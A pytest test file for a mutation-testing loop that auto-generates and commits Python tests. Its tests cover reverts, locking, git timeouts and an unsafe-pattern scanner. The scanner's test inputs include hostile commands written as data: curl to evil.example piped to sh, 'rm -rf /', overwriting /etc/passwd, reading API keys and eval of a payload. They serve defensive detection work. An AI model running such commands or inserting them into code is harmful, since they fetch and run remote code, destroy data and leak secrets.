"""Pytest tests for mutation_kill_loop_python.py — the Python/mutmut
counterpart to mutation_kill_loop.py's survivor-kill loop mechanics (#1357).

Every mutmut / git / pytest subprocess is mocked — no real mutmut run
happens here (that's covered by the manual, real-tool dogfooding recorded
in #1354/#1357's issue history). Insertion mechanics run against real
tmp_path files since they're pure file I/O with no subprocess involved. A
handful of git_reset_and_revert regression tests use a REAL tmp_path git
repo (no mocks) — see their docstrings (#1598/#1584 review).
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest
from _mutation_test_helpers import (
    FORBIDDEN_LITERALS,
    SCRIPTS_DIR,
    git_hermetic,
    hermetic_git_env,
)

sys.path.insert(0, str(SCRIPTS_DIR))

import mutation_kill_loop_python as loop


# =============================================================================
# Reused headless helpers actually come from mutation_kill_headless
# =============================================================================
def test_headless_helpers_are_reused_not_duplicated():
    import mutation_kill_headless as cs_headless

    assert loop.strip_code_fences is cs_headless.strip_code_fences
    assert loop.resolve_model is cs_headless.resolve_model
    assert loop.claude_cli_available is cs_headless.claude_cli_available
    assert loop.CLAUDE_CLI == cs_headless.CLAUDE_CLI


# =============================================================================
# extract_survivors — delegates to mutation_report's junitxml support
# =============================================================================
def _junit(*testcases: str, failures: int = 0) -> str:
    body = "\n".join(testcases)
    return (
        '<?xml version="1.0" ?>\n'
        f'<testsuites errors="0" failures="{failures}" tests="{len(testcases)}">\n'
        f'<testsuite errors="0" failures="{failures}" name="mutmut" tests="{len(testcases)}">\n'
        f"{body}\n</testsuite></testsuites>\n"
    )


def _survived(name: str, file: str, line: int) -> str:
    return (
        f'<testcase name="{name}" file="{file}" line="{line}">'
        '<failure type="failure" message="bad_survived">diff</failure></testcase>'
    )


def _killed(name: str, file: str, line: int) -> str:
    return f'<testcase name="{name}" file="{file}" line="{line}"><system-out>x</system-out></testcase>'


def test_run_scoped_mutmut_reverts_source_file_even_when_mutmut_crashes(
    tmp_path: Path, monkeypatch
):
    """mutmut mutates the real source file on disk per-mutant and restores it
    when done — but a mutmut-internal crash (real, reproducible: mutmut
    2.5.1's own cache layer, confirmed while dogfooding this exact function
    against hooks/mutation_adapters/mutmut.py, #1357) skips that restore and
    leaves mutated content on disk. run_scoped_mutmut must always revert the
    source file, even when the mutmut subprocess itself raises."""
    monkeypatch.setattr(loop, "_mutmut_argv", lambda: ["mutmut"])

    def boom(*_a, **_k):
        raise RuntimeError("simulated mutmut internal crash")

    monkeypatch.setattr(loop.subprocess, "run", boom)

    reverted = []
    monkeypatch.setattr(loop, "git_revert", lambda path, **k: reverted.append(path))

    with pytest.raises(RuntimeError):
        loop.run_scoped_mutmut("src/a.py", test_command="pytest", cwd=tmp_path)

    assert reverted == [Path("src/a.py")]


def test_run_scoped_mutmut_reverts_source_file_on_the_success_path_too(
    tmp_path: Path, monkeypatch
):
    monkeypatch.setattr(loop, "_mutmut_argv", lambda: ["mutmut"])

    class _FakeCompleted:
        stdout = "<testsuites></testsuites>"

    monkeypatch.setattr(loop.subprocess, "run", lambda *a, **k: _FakeCompleted())

    reverted = []
    monkeypatch.setattr(loop, "git_revert", lambda path, **k: reverted.append(path))

    loop.run_scoped_mutmut("src/a.py", test_command="pytest", cwd=tmp_path)

    assert reverted == [Path("src/a.py")]


def test_run_scoped_mutmut_reverts_test_file_too_when_mutmut_crashes(
    tmp_path: Path, monkeypatch
):
    """mutmut 2.5.1 has also been observed to corrupt the *runner's test
    file* (truncate it to empty via a crashed .bak-restore, #1359) — not
    just the source file. run_scoped_mutmut must revert both when a
    test_file is supplied, even when the mutmut subprocess itself raises."""
    monkeypatch.setattr(loop, "_mutmut_argv", lambda: ["mutmut"])

    def boom(*_a, **_k):
        raise RuntimeError("simulated mutmut internal crash")

    monkeypatch.setattr(loop.subprocess, "run", boom)

    reverted = []
    monkeypatch.setattr(loop, "git_revert", lambda path, **k: reverted.append(path))

    with pytest.raises(RuntimeError):
        loop.run_scoped_mutmut(
            "src/a.py",
            test_command="pytest",
            test_file=Path("tests/test_a.py"),
            cwd=tmp_path,
        )

    assert reverted == [Path("src/a.py"), Path("tests/test_a.py")]


def test_run_scoped_mutmut_reverts_test_file_on_the_success_path_too(
    tmp_path: Path, monkeypatch
):
    monkeypatch.setattr(loop, "_mutmut_argv", lambda: ["mutmut"])

    class _FakeCompleted:
        stdout = "<testsuites></testsuites>"

    monkeypatch.setattr(loop.subprocess, "run", lambda *a, **k: _FakeCompleted())

    reverted = []
    monkeypatch.setattr(loop, "git_revert", lambda path, **k: reverted.append(path))

    loop.run_scoped_mutmut(
        "src/a.py",
        test_command="pytest",
        test_file=Path("tests/test_a.py"),
        cwd=tmp_path,
    )

    assert reverted == [Path("src/a.py"), Path("tests/test_a.py")]


def test_run_scoped_mutmut_does_not_revert_test_file_when_not_supplied(
    tmp_path: Path, monkeypatch
):
    """Backward compatibility: callers that don't pass test_file (none did
    before #1359) must see identical behavior to before this change."""
    monkeypatch.setattr(loop, "_mutmut_argv", lambda: ["mutmut"])

    class _FakeCompleted:
        stdout = "<testsuites></testsuites>"

    monkeypatch.setattr(loop.subprocess, "run", lambda *a, **k: _FakeCompleted())

    reverted = []
    monkeypatch.setattr(loop, "git_revert", lambda path, **k: reverted.append(path))

    loop.run_scoped_mutmut("src/a.py", test_command="pytest", cwd=tmp_path)

    assert reverted == [Path("src/a.py")]


# =============================================================================
# Scenario: the .mutmut-cache delete/run/revert sequence is lock-guarded so
# two concurrent scoped runs against the same repo can't corrupt each
# other's cache state (#1584)
# =============================================================================
def test_run_scoped_mutmut_releases_the_lock_after_a_successful_run(
    tmp_path: Path, monkeypatch
):
    monkeypatch.setattr(loop, "_mutmut_argv", lambda: ["mutmut"])

    class _FakeCompleted:
        stdout = "<testsuites></testsuites>"

    monkeypatch.setattr(loop.subprocess, "run", lambda *a, **k: _FakeCompleted())
    monkeypatch.setattr(loop, "git_revert", lambda path, **k: None)

    loop.run_scoped_mutmut("src/a.py", test_command="pytest", cwd=tmp_path)

    assert not (tmp_path / ".mutmut-cache.lock").exists()


def test_run_scoped_mutmut_releases_the_lock_even_when_mutmut_crashes(
    tmp_path: Path, monkeypatch
):
    monkeypatch.setattr(loop, "_mutmut_argv", lambda: ["mutmut"])

    def boom(*_a, **_k):
        raise RuntimeError("simulated mutmut internal crash")

    monkeypatch.setattr(loop.subprocess, "run", boom)
    monkeypatch.setattr(loop, "git_revert", lambda path, **k: None)

    with pytest.raises(RuntimeError):
        loop.run_scoped_mutmut("src/a.py", test_command="pytest", cwd=tmp_path)

    assert not (tmp_path / ".mutmut-cache.lock").exists()


def test_acquire_mutmut_cache_lock_times_out_when_already_held(tmp_path: Path):
    held = loop._acquire_mutmut_cache_lock(tmp_path)
    try:
        with pytest.raises(RuntimeError, match="timed out"):
            loop._acquire_mutmut_cache_lock(tmp_path, timeout=0.3)
    finally:
        loop._release_mutmut_cache_lock(held)


def test_acquire_mutmut_cache_lock_succeeds_once_released(tmp_path: Path):
    lock_dir = loop._acquire_mutmut_cache_lock(tmp_path)
    assert lock_dir.exists()
    loop._release_mutmut_cache_lock(lock_dir)
    assert not lock_dir.exists()

    # A second acquire after release must succeed immediately, not raise.
    second = loop._acquire_mutmut_cache_lock(tmp_path, timeout=1)
    loop._release_mutmut_cache_lock(second)


def test_extract_survivors_filters_to_target_file():
    xml = _junit(
        _survived("Mutant #1", "src/a.py", 5),
        _survived("Mutant #2", "src/b.py", 9),
        _killed("Mutant #3", "src/a.py", 1),
        failures=2,
    )
    survivors = loop.extract_survivors(xml, "src/a.py")

    assert len(survivors) == 1
    assert survivors[0]["location"]["start"]["line"] == 5
    assert survivors[0]["mutatorName"] == "mutmut"


# =============================================================================
# Insertion mechanics — flat top-level `def test_*():` convention
# =============================================================================
def test_append_at_end_of_file_adds_new_tests(tmp_path: Path):
    test_file = tmp_path / "test_calc.py"
    existing = "def test_existing():\n    assert True\n"
    test_file.write_text(existing, encoding="utf-8")

    loop.append_at_end_of_file(test_file, "def test_new():\n    assert 1 == 1\n", existing)

    text = test_file.read_text(encoding="utf-8")
    assert "def test_existing():" in text
    assert "def test_new():" in text
    # existing content preserved, new content appended after it
    assert text.index("test_existing") < text.index("test_new")


def test_append_refuses_when_no_existing_top_level_test_function(tmp_path: Path):
    """A class-based test file (or any file with no top-level `def test_`)
    doesn't match the flat convention this heuristic supports — refuse
    rather than guess an insertion point."""
    test_file = tmp_path / "test_calc.py"
    class_based = "class TestCalc:\n    def test_existing(self):\n        assert True\n"
    test_file.write_text(class_based, encoding="utf-8")

    with pytest.raises(loop.InsertionRefused):
        loop.append_at_end_of_file(test_file, "def test_new():\n    assert True\n", class_based)

    # file must be left untouched on refusal
    assert "test_new" not in test_file.read_text(encoding="utf-8")


def test_detect_duplicate_functions_finds_name_collisions():
    existing = "def test_a():\n    pass\n\ndef test_b():\n    pass\n"
    incoming = "def test_b():\n    pass\n"
    assert loop.detect_duplicate_functions(existing, incoming) == ["test_b"]


def test_apply_generated_tests_empty_generation_not_inserted(tmp_path: Path):
    test_file = tmp_path / "test_calc.py"
    test_file.write_text("def test_existing():\n    assert True\n", encoding="utf-8")

    outcome = loop.apply_generated_tests(test_file, "   \n")

    assert outcome.inserted is False
    assert "no tests generated" in outcome.reason


def test_apply_generated_tests_duplicate_name_not_inserted(tmp_path: Path):
    test_file = tmp_path / "test_calc.py"
    test_file.write_text("def test_existing():\n    assert True\n", encoding="utf-8")

    outcome = loop.apply_generated_tests(
        test_file, "def test_existing():\n    assert False\n"
    )

    assert outcome.inserted is False
    assert "duplicate" in outcome.reason
    # original content unchanged
    assert "assert True" in test_file.read_text(encoding="utf-8")


def test_apply_generated_tests_duplicate_check_uses_fresh_disk_content(tmp_path: Path):
    """The duplicate-name check must run against the CURRENT file content —
    not a pre-generation snapshot a caller might otherwise thread through —
    so a test function added to the file externally between an earlier read
    (e.g. before generate()) and this call is still caught as a duplicate
    rather than silently double-inserted (#1598/#1584 review, item 7)."""
    test_file = tmp_path / "test_calc.py"
    # Stands in for: the file already has test_new by the time
    # apply_generated_tests actually runs, even though an earlier read
    # (simulated by generate() in the real loop) would not have seen it yet.
    test_file.write_text(
        "def test_existing():\n"
        "    assert True\n"
        "\n"
        "def test_new():\n"
        "    assert 2 == 2\n",
        encoding="utf-8",
    )
    before = test_file.read_text(encoding="utf-8")

    outcome = loop.apply_generated_tests(test_file, "def test_new():\n    assert 2 == 2\n")

    assert outcome.inserted is False
    assert "duplicate" in outcome.reason
    assert test_file.read_text(encoding="utf-8") == before


def test_append_at_end_of_file_operates_on_the_given_text_not_disk_content(
    tmp_path: Path,
):
    """append_at_end_of_file takes the current text as a required, positional
    argument and performs no read of its own (#1598/#1584 review, item 7) —
    freshness is entirely apply_generated_tests's responsibility. On-disk
    content here has no top-level `def test_*():` at all (which the
    heuristic refuses) while the explicitly-passed text does. If the
    function silently re-read from disk instead of using the given text,
    this would raise InsertionRefused; using the given text, it must
    succeed."""
    test_file = tmp_path / "test_calc.py"
    test_file.write_text(
        "class TestCalc:\n    def test_existing(self):\n        assert True\n",
        encoding="utf-8",
    )

    loop.append_at_end_of_file(
        test_file, "def test_new():\n    assert True\n", "def test_existing():\n    assert True\n"
    )

    assert "test_new" in test_file.read_text(encoding="utf-8")


def test_apply_generated_tests_success_path_inserts(tmp_path: Path):
    test_file = tmp_path / "test_calc.py"
    test_file.write_text("def test_existing():\n    assert True\n", encoding="utf-8")

    outcome = loop.apply_generated_tests(test_file, "def test_new():\n    assert 2 == 2\n")

    assert outcome.inserted is True
    assert "def test_new():" in test_file.read_text(encoding="utf-8")


# =============================================================================
# Scenario: Generated test code with unsafe side effects is refused, not
# silently inserted and auto-committed with zero human review (#1560) —
# the Python/mutmut counterpart of mutation_kill_insert's C# deny-list.
# =============================================================================
@pytest.mark.parametrize(
    ("category", "snippet"),
    [
        ("network", "resp = requests.get(url)"),
        ("network", "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)"),
        ("process", 'subprocess.run(["curl", "http://evil.example"])'),
        ("process", 'os.system("rm -rf /")'),
        # os.spawn* family and a bare imported name (from subprocess import
        # Popen) — evaded a prefix-only pattern.
        ("process", 'os.spawnl(os.P_WAIT, "/bin/sh", "sh", "-c", "curl evil|sh")'),
        ("process", 'Popen(["curl", "http://evil.example"])'),
        ("filesystem", 'open("/etc/passwd", "w").write("pwned")'),
        ("filesystem", 'open("/etc/passwd", "a").write("pwned")'),
        ("filesystem", "shutil.rmtree('/important')"),
        # Split-statement Path().write_text — a separate constructor call and
        # method call evaded a single-chained-expression-only pattern.
        ("filesystem", 'p = Path("/etc/passwd"); p.write_text("pwned")'),
        # Whitespace around the member-access dot — legitimate (if
        # unconventional) Python, not obfuscation.
        ("process", 'subprocess .run(["curl", "http://evil.example"])'),
        ("environment", 'secret = os.environ["API_KEY"]'),
        ("environment", 'secret = os.getenv("API_KEY")'),
        ("reflection", 'importlib.import_module("os")'),
        ("interop", "eval(payload)"),
        ("interop", "ctypes.CDLL('libc.so.6')"),
        ("interop", "eval (payload)"),
    ],
    ids=[
        "network-requests",
        "network-socket",
        "process-subprocess",
        "process-os-system",
        "process-os-spawnl",
        "process-bare-popen",
        "filesystem-open-write",
        "filesystem-open-append",
        "filesystem-shutil-rmtree",
        "filesystem-split-statement-write-text",
        "process-whitespace-dot",
        "environment-os-environ",
        "environment-os-getenv",
        "reflection-importlib",
        "interop-eval",
        "interop-ctypes",
        "interop-eval-whitespace",
    ],
)
def test_scan_for_unsafe_patterns_flags_each_category(category: str, snippet: str):
    assert category in loop.scan_for_unsafe_patterns(snippet)


def test_scan_for_unsafe_patterns_returns_empty_for_a_clean_test():
    assert loop.scan_for_unsafe_patterns("def test_new():\n    assert 2 == 2\n") == []


def test_unsafe_generated_test_is_refused_not_inserted(tmp_path: Path):
    test_file = tmp_path / "test_calc.py"
    test_file.write_text("def test_existing():\n    assert True\n", encoding="utf-8")
    before = test_file.read_text(encoding="utf-8")
    unsafe_test = 'def test_new():\n    requests.get("http://evil.example")\n'

    outcome = loop.apply_generated_tests(test_file, unsafe_test)

    assert outcome.inserted is False
    assert "unsafe" in outcome.reason.lower()
    assert "network" in outcome.reason
    assert test_file.read_text(encoding="utf-8") == before


# =============================================================================
# Scenario: git add/commit are scoped to the pathspec, not parsed as flags
# (#1584 — mirrors the C# loop's git_commit)
# =============================================================================
def test_git_commit_scopes_add_and_commit_to_the_test_file(tmp_path: Path, monkeypatch):
    calls: list = []

    class _R:
        returncode = 0

    def fake_run(argv, **kwargs):
        calls.append(argv)
        return _R()

    monkeypatch.setattr(loop.subprocess, "run", fake_run)

    result = loop.git_commit("msg", tmp_path / "test_calc.py")

    assert result is True
    assert calls[0] == [
        "git",
        "--literal-pathspecs",
        "add",
        "--",
        str(tmp_path / "test_calc.py"),
    ]
    assert calls[1] == [
        "git",
        "--literal-pathspecs",
        "commit",
        "-m",
        "msg",
        "--",
        str(tmp_path / "test_calc.py"),
    ]


# =============================================================================
# Scenario: A hung `git checkout`/`git add`/`git commit`/`git reset` is
# bounded by a timeout, not left to hang the loop forever — mirrors
# mutation_kill_loop.py's _GIT_TIMEOUT coverage (#1598/#1584 review, item 2).
# Previously none of git_revert/git_reset_and_revert/git_commit passed
# timeout= at all, so an unbounded git call here could hang forever instead
# of ever reaching the RuntimeError/exit-4 fatal-revert path.
# =============================================================================
def test_git_revert_passes_a_timeout(tmp_path: Path, monkeypatch):
    captured: dict = {}

    class _R:
        returncode = 0

    def fake_run(argv, **k):
        captured.update(k)
        return _R()

    monkeypatch.setattr(loop.subprocess, "run", fake_run)

    loop.git_revert(tmp_path / "test_calc.py")

    assert captured["timeout"] == loop._GIT_TIMEOUT_S


def test_git_revert_timeout_is_logged_not_raised(tmp_path: Path, monkeypatch, capsys):
    def fake_run(argv, **kwargs):
        raise loop.subprocess.TimeoutExpired(argv, kwargs["timeout"])

    monkeypatch.setattr(loop.subprocess, "run", fake_run)

    assert loop.git_revert(tmp_path / "test_calc.py") is False  # must not raise
    err = capsys.readouterr().err
    assert str(loop._GIT_TIMEOUT_S) in err
    assert "DEV_TEAM_MUTATION_GIT_TIMEOUT_S" in err
    assert "git checkout" in err


def test_git_revert_returns_true_on_success(tmp_path: Path, monkeypatch):
    class _R:
        returncode = 0

    monkeypatch.setattr(loop.subprocess, "run", lambda argv, **k: _R())

    assert loop.git_revert(tmp_path / "test_calc.py") is True


def test_git_revert_returns_false_on_nonzero_exit(tmp_path: Path, monkeypatch):
    class _R:
        returncode = 1

    monkeypatch.setattr(loop.subprocess, "run", lambda argv, **k: _R())

    assert loop.git_revert(tmp_path / "test_calc.py") is False


def test_git_commit_passes_a_timeout_to_add_and_commit(tmp_path: Path, monkeypatch):
    calls: list = []

    class _R:
        returncode = 0

    def fake_run(argv, **kwargs):
        calls.append((argv, kwargs))
        return _R()

    monkeypatch.setattr(loop.subprocess, "run", fake_run)

    result = loop.git_commit("msg", tmp_path / "test_calc.py")

    assert result is True
    assert calls[0][1]["timeout"] == loop._GIT_TIMEOUT_S
    assert calls[1][1]["timeout"] == loop._GIT_TIMEOUT_S


def test_git_commit_add_leg_timeout_returns_false(tmp_path: Path, monkeypatch, capsys):
    def fake_run(argv, **kwargs):
        raise loop.subprocess.TimeoutExpired(argv, kwargs["timeout"])

    monkeypatch.setattr(loop.subprocess, "run", fake_run)

    assert loop.git_commit("msg", tmp_path / "test_calc.py") is False
    err = capsys.readouterr().err
    assert str(loop._GIT_TIMEOUT_S) in err
    assert "git add" in err


def test_git_commit_commit_leg_timeout_returns_false(tmp_path: Path, monkeypatch, capsys):
    """The `git add` leg succeeds; only the `git commit` leg's own call
    times out — a distinct branch from the add-leg timeout above."""
    calls: list = []

    class _R:
        returncode = 0

    def fake_run(argv, **kwargs):
        calls.append(argv)
        if len(calls) == 1:
            return _R()
        raise loop.subprocess.TimeoutExpired(argv, kwargs["timeout"])

    monkeypatch.setattr(loop.subprocess, "run", fake_run)

    assert loop.git_commit("msg", tmp_path / "test_calc.py") is False
    assert calls[0][:3] == ["git", "--literal-pathspecs", "add"]
    err = capsys.readouterr().err
    assert str(loop._GIT_TIMEOUT_S) in err
    assert "git commit" in err


# =============================================================================
# Scenario: git_reset_and_revert's own internal failure branches — every
# other test either exercises the full real-git success path or mocks
# git_reset_and_revert away wholesale (#1598/#1584 review, item 10).
# =============================================================================
def test_git_reset_and_revert_returns_false_when_reset_fails(
    tmp_path: Path, monkeypatch
):
    calls: list = []

    class _R:
        def __init__(self, returncode):
            self.returncode = returncode

    def fake_run(argv, **kwargs):
        calls.append(argv)
        return _R(1)  # reset fails

    monkeypatch.setattr(loop.subprocess, "run", fake_run)

    assert loop.git_reset_and_revert(tmp_path / "test_calc.py") is False
    # Only the reset call happens — checkout (git_revert) is never reached.
    assert len(calls) == 1
    assert calls[0][:3] == ["git", "--literal-pathspecs", "reset"]


def test_git_reset_and_revert_returns_false_when_reset_times_out(
    tmp_path: Path, monkeypatch
):
    def fake_run(argv, **kwargs):
        raise loop.subprocess.TimeoutExpired(argv, kwargs["timeout"])

    monkeypatch.setattr(loop.subprocess, "run", fake_run)

    assert loop.git_reset_and_revert(tmp_path / "test_calc.py") is False


def test_git_reset_and_revert_returns_false_when_checkout_fails_after_reset_succeeds(
    tmp_path: Path, monkeypatch
):
    calls: list = []

    class _R:
        def __init__(self, returncode):
            self.returncode = returncode

    def fake_run(argv, **kwargs):
        calls.append(argv)
        if argv[2] == "reset":
            return _R(0)  # reset succeeds
        return _R(1)  # checkout (git_revert) fails

    monkeypatch.setattr(loop.subprocess, "run", fake_run)

    assert loop.git_reset_and_revert(tmp_path / "test_calc.py") is False
    assert [c[2] for c in calls] == ["reset", "checkout"]


def test_git_reset_and_revert_returns_true_when_both_steps_succeed(
    tmp_path: Path, monkeypatch
):
    class _R:
        returncode = 0

    monkeypatch.setattr(loop.subprocess, "run", lambda argv, **k: _R())

    assert loop.git_reset_and_revert(tmp_path / "test_calc.py") is True


# =============================================================================
# Scenario: A headless (unattended, zero-human-review) commit carries an
# audit trail distinguishing it from an agent-driven one (#1560)
# =============================================================================
def test_commit_message_omits_generator_trailer_by_default():
    message = loop._commit_message(1, "calc.py", 2, "def test_new(): pass\n")
    assert "Generator:" not in message


def test_commit_message_includes_generator_trailer_when_labeled():
    message = loop._commit_message(
        1, "calc.py", 2, "def test_new(): pass\n", generator_label="headless (some-model)"
    )
    assert "Generator: headless (some-model)" in message


def test_commit_message_generator_label_newlines_cannot_forge_extra_lines():
    # A pipeline-supplied model string containing newlines must not be able
    # to inject a second, forged "Generator:" trailer *line* into the
    # commit — the injected text is neutralized onto the same line instead.
    message = loop._commit_message(
        1,
        "calc.py",
        2,
        "def test_new(): pass\n",
        generator_label="some-model\n\nGenerator: agent-driven (reviewed)",
    )
    lines_starting_with_generator = [
        line for line in message.splitlines() if line.startswith("Generator:")
    ]
    assert len(lines_starting_with_generator) == 1


# =============================================================================
# run_for_file — full loop with every subprocess mocked
# =============================================================================
def test_run_for_file_stops_immediately_on_zero_survivors(tmp_path: Path, monkeypatch):
    calls = {"generate": 0}
    monkeypatch.setattr(loop, "run_scoped_mutmut", lambda *a, **k: _junit(_killed("Mutant #1", "src/a.py", 1)))

    def fake_generate(*_args):
        calls["generate"] += 1
        return "def test_new():\n    assert True\n"

    test_file = tmp_path / "test_a.py"
    test_file.write_text("def test_existing():\n    assert True\n", encoding="utf-8")
    source_file = tmp_path / "a.py"
    source_file.write_text("x = 1\n", encoding="utf-8")

    loop.run_for_file(
        "src/a.py",
        test_file=test_file,
        source_path=source_file,
        test_command="pytest",
        generate=fake_generate,
    )

    assert calls["generate"] == 0
    assert "test_new" not in test_file.read_text(encoding="utf-8")


def test_run_for_file_does_not_treat_zero_mutants_as_convergence(
    tmp_path: Path, monkeypatch
):
    """mutmut<3 crashes on Python 3.13+ ('TypeError: cannot pickle
    itertools.count object', #1359) and produces a junitxml report with
    zero testcases at all — indistinguishable from real survivors=0 by
    count alone. run_for_file must not log "no survivors — done" (a false
    convergence claim) for this case, and must never call generate()."""
    empty_junit = (
        '<?xml version="1.0" ?>\n'
        '<testsuites disabled="0" errors="0" failures="0" tests="0" time="0.0">'
        '<testsuite disabled="0" errors="0" failures="0" name="mutmut" '
        'skipped="0" tests="0" time="0"/></testsuites>\n'
    )
    monkeypatch.setattr(loop, "run_scoped_mutmut", lambda *a, **k: empty_junit)

    calls = {"generate": 0}

    def fake_generate(*_args):
        calls["generate"] += 1
        return "def test_new():\n    assert True\n"

    test_file = tmp_path / "test_a.py"
    test_file.write_text("def test_existing():\n    assert True\n", encoding="utf-8")
    source_file = tmp_path / "a.py"
    source_file.write_text("x = 1\n", encoding="utf-8")

    logged = []
    loop.run_for_file(
        "src/a.py",
        test_file=test_file,
        source_path=source_file,
        test_command="pytest",
        generate=fake_generate,
        log=logged.append,
    )

    assert calls["generate"] == 0
    assert not any("no survivors" in line for line in logged)
    assert any("zero mutants generated" in line for line in logged)
    assert any("NOT convergence" in line for line in logged)


def test_run_for_file_generates_inserts_and_commits_on_green(tmp_path: Path, monkeypatch):
    """One round: survivors found -> generate -> insert -> compile+test pass
    -> commit. Then a second scoped run reports zero survivors, so the loop
    stops cleanly without a second commit attempt."""
    xml_with_survivor = _junit(_survived("Mutant #1", "src/a.py", 3), failures=1)
    xml_clean = _junit(_killed("Mutant #1", "src/a.py", 3))
    responses = [xml_with_survivor, xml_clean]
    monkeypatch.setattr(loop, "run_scoped_mutmut", lambda *a, **k: responses.pop(0))
    monkeypatch.setattr(loop, "python_compiles", lambda *a, **k: True)
    monkeypatch.setattr(loop, "run_scoped_pytest", lambda *a, **k: True)

    committed = []
    monkeypatch.setattr(
        loop, "git_commit", lambda message, test_file, **k: committed.append(message) or True
    )
    monkeypatch.setattr(loop, "git_revert", lambda *a, **k: pytest.fail("must not revert on green"))

    test_file = tmp_path / "test_a.py"
    test_file.write_text("def test_existing():\n    assert True\n", encoding="utf-8")
    source_file = tmp_path / "a.py"
    source_file.write_text("x = 1\n", encoding="utf-8")

    loop.run_for_file(
        "src/a.py",
        test_file=test_file,
        source_path=source_file,
        test_command="pytest",
        generate=lambda *_a: "def test_new():\n    assert 1 == 1\n",
    )

    assert "def test_new():" in test_file.read_text(encoding="utf-8")
    assert len(committed) == 1
    assert "kill round 1" in committed[0]


def test_run_for_file_reverts_on_failing_scoped_test(tmp_path: Path, monkeypatch):
    monkeypatch.setattr(
        loop, "run_scoped_mutmut", lambda *a, **k: _junit(_survived("Mutant #1", "src/a.py", 3), failures=1)
    )
    monkeypatch.setattr(loop, "python_compiles", lambda *a, **k: True)
    monkeypatch.setattr(loop, "run_scoped_pytest", lambda *a, **k: False)

    reverted = []
    monkeypatch.setattr(
        loop, "git_revert", lambda test_file, **k: reverted.append(test_file) or True
    )
    monkeypatch.setattr(
        loop, "git_commit", lambda *a, **k: pytest.fail("must not commit on a failing test")
    )

    test_file = tmp_path / "test_a.py"
    test_file.write_text("def test_existing():\n    assert True\n", encoding="utf-8")
    source_file = tmp_path / "a.py"
    source_file.write_text("x = 1\n", encoding="utf-8")

    loop.run_for_file(
        "src/a.py",
        test_file=test_file,
        source_path=source_file,
        test_command="pytest",
        generate=lambda *_a: "def test_new():\n    assert False\n",
    )

    assert reverted == [test_file]


def test_run_for_file_stops_on_no_improvement(tmp_path: Path, monkeypatch):
    """Same survivor count twice in a row must stop the loop, not loop forever."""
    same_xml = _junit(_survived("Mutant #1", "src/a.py", 3), failures=1)
    responses = [same_xml, same_xml]
    monkeypatch.setattr(loop, "run_scoped_mutmut", lambda *a, **k: responses.pop(0))
    monkeypatch.setattr(loop, "python_compiles", lambda *a, **k: True)
    monkeypatch.setattr(loop, "run_scoped_pytest", lambda *a, **k: True)

    committed = []
    monkeypatch.setattr(loop, "git_commit", lambda m, f, **k: committed.append(m) or True)

    test_file = tmp_path / "test_a.py"
    test_file.write_text("def test_existing():\n    assert True\n", encoding="utf-8")
    source_file = tmp_path / "a.py"
    source_file.write_text("x = 1\n", encoding="utf-8")

    calls = {"n": 0}

    def fake_generate(*_a):
        calls["n"] += 1
        return f"def test_new_{calls['n']}():\n    assert True\n"

    loop.run_for_file(
        "src/a.py",
        test_file=test_file,
        source_path=source_file,
        test_command="pytest",
        generate=fake_generate,
        max_rounds=5,
    )

    # Round 1 commits (first round always proceeds — prev_survivors starts
    # None); round 2 sees the same count and stops without generating again.
    assert len(committed) == 1
    assert calls["n"] == 1


# =============================================================================
# Scenario: A failed commit is a round failure, not a silent success (#1598),
# mirroring mutation_kill_loop.py's C# equivalent scenario.
# =============================================================================
def test_failed_commit_reverts_and_stops_the_round(tmp_path: Path, monkeypatch):
    monkeypatch.setattr(
        loop, "run_scoped_mutmut", lambda *a, **k: _junit(_survived("Mutant #1", "src/a.py", 3), failures=1)
    )
    monkeypatch.setattr(loop, "python_compiles", lambda *a, **k: True)
    monkeypatch.setattr(loop, "run_scoped_pytest", lambda *a, **k: True)

    events: list = []
    monkeypatch.setattr(
        loop, "git_commit", lambda msg, tf, **k: events.append(("commit", msg)) or False
    )
    monkeypatch.setattr(
        loop,
        "git_reset_and_revert",
        lambda tf, **k: events.append(("revert", str(tf))) or True,
    )

    test_file = tmp_path / "test_a.py"
    test_file.write_text("def test_existing():\n    assert True\n", encoding="utf-8")
    source_file = tmp_path / "a.py"
    source_file.write_text("x = 1\n", encoding="utf-8")

    calls = {"n": 0}

    def fake_generate(*_a):
        calls["n"] += 1
        return "def test_new():\n    assert True\n"

    loop.run_for_file(
        "src/a.py",
        test_file=test_file,
        source_path=source_file,
        test_command="pytest",
        generate=fake_generate,
    )

    kinds = [e[0] for e in events]
    assert kinds.count("commit") == 1
    assert kinds.count("revert") == 1
    assert calls["n"] == 1


def test_revert_failure_after_failed_commit_is_fatal(tmp_path: Path, monkeypatch):
    monkeypatch.setattr(
        loop, "run_scoped_mutmut", lambda *a, **k: _junit(_survived("Mutant #1", "src/a.py", 3), failures=1)
    )
    monkeypatch.setattr(loop, "python_compiles", lambda *a, **k: True)
    monkeypatch.setattr(loop, "run_scoped_pytest", lambda *a, **k: True)
    monkeypatch.setattr(loop, "git_commit", lambda msg, tf, **k: False)
    # The commit-failure revert path calls git_reset_and_revert, not plain
    # git_revert (#1598/#1584 review) — that's the function that must fail.
    monkeypatch.setattr(loop, "git_reset_and_revert", lambda tf, **k: False)

    test_file = tmp_path / "test_a.py"
    test_file.write_text("def test_existing():\n    assert True\n", encoding="utf-8")
    source_file = tmp_path / "a.py"
    source_file.write_text("x = 1\n", encoding="utf-8")

    with pytest.raises(RuntimeError, match="revert failed"):
        loop.run_for_file(
            "src/a.py",
            test_file=test_file,
            source_path=source_file,
            test_command="pytest",
            generate=lambda *_a: "def test_new():\n    assert True\n",
        )


def test_revert_failure_after_build_failure_is_fatal(tmp_path: Path, monkeypatch):
    monkeypatch.setattr(
        loop, "run_scoped_mutmut", lambda *a, **k: _junit(_survived("Mutant #1", "src/a.py", 3), failures=1)
    )
    monkeypatch.setattr(loop, "python_compiles", lambda *a, **k: False)
    monkeypatch.setattr(loop, "git_revert", lambda tf, **k: False)

    test_file = tmp_path / "test_a.py"
    test_file.write_text("def test_existing():\n    assert True\n", encoding="utf-8")
    source_file = tmp_path / "a.py"
    source_file.write_text("x = 1\n", encoding="utf-8")

    with pytest.raises(RuntimeError, match="revert failed"):
        loop.run_for_file(
            "src/a.py",
            test_file=test_file,
            source_path=source_file,
            test_command="pytest",
            generate=lambda *_a: "def test_new():\n    assert True\n",
        )


def test_revert_failure_after_test_failure_is_fatal(tmp_path: Path, monkeypatch):
    monkeypatch.setattr(
        loop, "run_scoped_mutmut", lambda *a, **k: _junit(_survived("Mutant #1", "src/a.py", 3), failures=1)
    )
    monkeypatch.setattr(loop, "python_compiles", lambda *a, **k: True)
